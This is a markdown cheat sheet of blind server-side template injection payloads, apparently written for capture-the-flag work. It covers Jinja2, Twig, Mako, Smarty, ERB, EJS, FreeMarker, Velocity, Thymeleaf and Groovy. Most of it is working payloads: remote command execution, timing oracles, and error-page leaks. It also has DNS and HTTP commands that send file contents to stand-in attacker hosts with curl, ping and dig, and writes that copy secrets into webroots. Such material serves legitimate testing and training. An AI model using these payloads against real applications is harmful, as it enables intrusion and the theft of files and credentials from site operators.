# Blind SSTI — no output, OOB-only exploitation

The template evaluates but you never see the result — the input
lands in an email, a PDF, an admin report, or a second-order
render. Extraction runs over timing, errors, and OOB channels.

---

## 1. The blind-confirm — timing first

```jinja2
{{lipsum.__globals__.os.popen('sleep 5').read()}}
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__.os.popen('sleep 5').read()}}
{%if 7*7==49%}{{lipsum.__globals__.time.sleep(5)}}{%endif%}
   -- lipsum has time? no — use os:
{{lipsum.__globals__.os.popen('sleep 5').read()}}
```

```twig
{{['sleep 5']|map('system')|join}}
{{['sleep 5']|filter('system')|join}}
```

```mako
${__import__('time').sleep(5)}
${__import__('os').system('sleep 5')}
```

```smarty
{php}sleep(5);{/php}
{'sleep 5'|system}
{if sleep(5)}{/if}
```

A 5-second response delta is the blind confirmation — no output
needed. Do a baseline vs sleep-0 vs sleep-5 triple-probe to rule
out noise.

---

## 2. The OOB channels — DNS/HTTP

```jinja2
{{lipsum.__globals__.os.popen('curl https://me/x').read()}}
{{lipsum.__globals__.os.popen('wget -qO- https://me/x').read()}}
{{lipsum.__globals__.os.popen('nslookup x.me').read()}}
   -- DNS works when HTTP-egress blocked
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__.os.popen('curl https://me/`id`').read()}}
   -- data-in-url exfil
{{lipsum.__globals__.os.popen('curl https://me/?d=`cat /flag|base64`').read()}}
   -- the flag itself via OOB
```

```twig
{{['curl https://me/`cat /flag|base64`']|map('system')|join}}
```

```mako
${__import__('os').popen('curl https://me/?d=`cat /flag`')}
${__import__('urllib.request').request.urlopen('https://me/?d='+open('/flag').read())}
```

```groovy
${'curl https://me/?d=$(cat /flag|base64)'.execute()}
${new URL('https://me/x').text}          -- URL fetch as primitive
```

```velocity
$x.class.forName('java.net.URL').getConstructor($x.class.forName('java.lang.String')).newInstance('https://me/x').openStream()
```

`tools/web/oob_listener.py --port 8000` — the repo listener for
the HTTP side; a real domain for the DNS side.

---

## 3. The boolean-blind extraction — char-by-char

When the render is invisible but the RESPONSE TIME or STATUS
differs — the payload makes truth observable:

```jinja2
{% if 'a' == open('/flag').read()[0] %}slow-path{% endif %}
   -- Jinja2: wrap the condition in a time-sink:
{{lipsum.__globals__.os.popen('sleep %d'|format(5)).read() if flag[0]=='f' else ''}}
   -- conditional-expr + sleep = timing oracle
```

Better — put the test INSIDE the shell command:

```jinja2
{{lipsum.__globals__.os.popen('test "`head -c1 /flag`" = "f" && sleep 3').read()}}
{{lipsum.__globals__.os.popen('grep -q ^f /flag && sleep 3').read()}}
   -- grep-prefix oracle — one query per candidate char,
      bisect not brute-force
```

The shell-side test trick — `test $(head -c1 /flag) = f && sleep 3`
— one request per char-position, ~N requests total instead of
N×36:

```jinja2
{{lipsum.__globals__.os.popen('cut -c3 /flag | grep -q ^x && sleep 3').read()}}
{{lipsum.__globals__.os.popen('grep -qE "^.{0,3}flag" /flag && sleep 3').read()}}
```

grep's `-c` for count-tests, `cut -cN` for the Nth char,
`grep -qE '^.{0,N}flag'` for prefix-at-position.

---

## 4. The error-channel — force the value into an error

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__.os.popen('cat /flag').read().__class__.__nonexistent__}}
   -- if the result lands in a stack-trace → exfil via error text

{{1/x}}                          -- divide by rendered value — if
                                  the VALUE lands in the error
                                  message itself, exfil complete
{{undefined_func('/flag-content')}}
```

Some apps log/render template errors — the error text IS the
exfil channel when it echoes the evaluated value.

---

## 5. The second-order paths — delayed render

```text
input → stored → rendered in:
  - admin report (daily digest)
  - invoice PDF (weasyprint/wkhtmltopdf)
  - email confirmation
  - push notification
  - export CSV→Excel (=cmd formula — different class)
```

For email render — send yourself the email; for PDF — download
the generated file; for admin-report — can't see it → all channels
must be OOB or self-readable artifacts.

---

## 6. The persistence trick — write-then-render

```jinja2
{{''.__class__.__mro__[1].__subclasses__()[N].__init__.__globals__['__builtins__'].open('/tmp/x','w').write('shellcode')}}
   -- write a file into the served dir → GET /x → proof
```

If the app writes your output into a downloadable artifact —
inject the payload such that the artifact's content IS the flag.
The "write a file" path turns blind into reflected.

---

## 7. The decision table

| What you see | Path |
|---|---|
| response delay differs | timing-oracle char-extract |
| no timing, no render | OOB DNS/HTTP |
| render is a PDF/email | self-fetched artifact |
| render only for admin | OOB or write-back-into-app |
| errors displayed | error-channel exfil |
| can write files | write-then-fetch |


---

## Blind-SSTI appendix — the no-channel playbook

### Channel-selection tree

```text
output suppressed? →
  1. does exec work? → write-to-webroot (if webroot writable+known)
  2. outbound HTTP open? → curl/wget OOB → oob_listener
  3. outbound DNS only? → dig/ping OOB → dns-listener
  4. neither? → time-sidechannel oracle — bit-by-bit — SLOW
  5. nothing? → error-channel — raise+content → error-page
```

### Write-to-webroot detail — finding the served dir

```bash
# common webroots:
/app/static /app/public /var/www/html /var/www/app/static
/usr/share/nginx/html /srv/www /public /static /assets
# find it:
find / -type d -name 'static' -o -name 'public' -o -name 'html' 2>/dev/null
find / -name 'index.html' 2>/dev/null
# then:
cat /flag > /app/static/f.txt   → GET /static/f.txt
cat /flag > /var/www/html/x     → GET /x
cp /flag /app/public/x.txt      → GET /x.txt
```

### The DNS-exfil — chunked

```bash
# split long content into dns-labels:
for i in $(seq 1 5); do
  ping -c1 $(cat /flag | xxd -p | head -c$((i*30)) | tail -c30).x.you.com
done
# or base32/base64-safe chars:
dig $(cat /flag | base64 | tr -d '=+/' | head -c40).x.you.com
# hex — always safe:
ping -c1 $(xxd -p /flag | tr -d '\n' | head -c40).x.you.com
```

### The HTTP-exfil — shaped

```bash
# GET-param:
curl "http://you/?d=$(cat /flag|base64|tr -d '\n')"
curl -G "http://you/" --data-urlencode "d=$(cat /flag)"
# POST-body:
curl -X POST http://you/ -d "$(cat /flag)"
curl -X POST http://you/ --data-binary @/flag
curl -F "f=@/flag" http://you/     # multipart-upload
# header-exfil:
curl -H "X-D: $(cat /flag|base64)" http://you/
# url-path exfil:
curl "http://you/$(cat /flag|xxd -p|tr -d '\n'|head -c40)"
```

### The timing-oracle — bit-or-char

```jinja2
{# per-char, binary-compare — the tightest loop: #}
{%set x = lipsum.__globals__.os.popen('cat /flag').read()%}
{%set n = x|length%}
len: {{n}}
{# then per-position binary search — 8 probes/char max: #}
{%if x[0:1] > 'l'%}{{lipsum.__globals__.time.sleep(3)}}{%endif%}
{# or per-bit — reliable regardless of charset: #}
{%if (lipsum.__globals__.ord(x[0]) & 64) == 64%}{{lipsum.__globals__.time.sleep(3)}}{%endif%}
```

### The error-channel — exception-as-output

```jinja2
{# wrap the read in a raise — the error-page shows it: #}
{{lipsum.__globals__.__builtins__.exec("raise Exception(open('/flag').read())")}}
{{x.__init__.__globals__['__builtins__']['exec']("raise ValueError(__import__('os').environ)")}}
{%set f=lipsum.__globals__.__builtins__.exec%}{{f("raise Exception(__import__('os').popen('cat /flag').read())")}}
```

```ruby
<%=raise File.read('/flag')%>
<%=raise File.read('/flag').inspect%>
<%=raise File.readlines('/flag').join%>
<%=throw :x, File.read('/flag')%>
<%=catch(:f){throw :f, File.read('/flag')}%>
<%=fail File.read('/flag')%>
<%=abort File.read('/flag')%>      {# aborts + message #}
```

### The log-channel — write to a log you can read

```bash
# your exec writes to a file the app serves/logs:
echo "$(cat /flag)" >> /var/log/x.log
# if /log-viewer renders it → read there
# or into the app-dir then view via the SSTI-read path:
echo "$(cat /flag)" > /app/x.txt   # then file-read it
```

### The order-of-operations — blind playbook

```text
1. confirm eval-in-blind:  {{7*7}}→silent BUT {{7*x}}→500? — the
   500-vs-200 status-delta proves eval (error-vs-success)
2. find ONE write:  {{lipsum.__globals__.os.system('touch /tmp/x')}}
   → then read /tmp/x via... hmm circular — webroot-test instead:
   os.system('touch /app/static/t') → GET /static/t → 200 = writable
3. write the flag:  os.system('cat /flag > /app/static/f') → GET it
4. no webroot? → OOB: dns-ping FIRST (often open), http second
5. neither? → time-oracle — but FIRST try error-channel —
   raise+content is faster than bit-oracles
6. nothing at all? → escalate — park SSTI — the input may not
   reach the render — check deferred channels again
```

### Blind per-engine one-liners

```text
Jinja2 write: {{lipsum.__globals__.os.system('cat /flag > /app/static/f')}}
Jinja2 oob:   {{lipsum.__globals__.os.system('curl me/?d=$(cat /flag|base64)')}}
Jinja2 err:   {{lipsum.__globals__.__builtins__.exec('raise Exception(open("/flag").read())')}}
Jinja2 time:  {%if lipsum.__globals__.os.popen('head -c1 /flag').read()=='f'%}{{lipsum.__globals__.time.sleep(3)}}{%endif%}
Twig write:   {{['cat /flag > /var/www/html/f']|map('system')}}
Twig oob:     {{['curl me/?d=$(cat /flag|base64)']|map('system')}}
Twig err:     {{['x']|map('file_get_contents')}} with bad-path → error leak?
ERB err:      <%=raise File.read('/flag')%>  — error-page = file
ERB oob:      <%=system('curl me/?d='+`cat /flag|base64`)%>
EJS oob:      <%=global.process.mainModule.require('child_process').execSync('curl me/?d=$(cat /flag|base64)')%>
EJS write:    <%=global.process.mainModule.require('fs').writeFileSync('/app/static/f',global.process.mainModule.require('fs').readFileSync('/flag'))%>
FM exec:      ${"freemarker.template.utility.Execute"?new()("cat /flag > /var/www/html/f")}
Velocity:     $x.class.forName('java.lang.Runtime').getRuntime().exec('sh -c "cat /flag > /var/www/html/f"')
Thymeleaf:    *{T(java.lang.Runtime).getRuntime().exec('sh -c "cat /flag > /var/www/html/f"')}
```
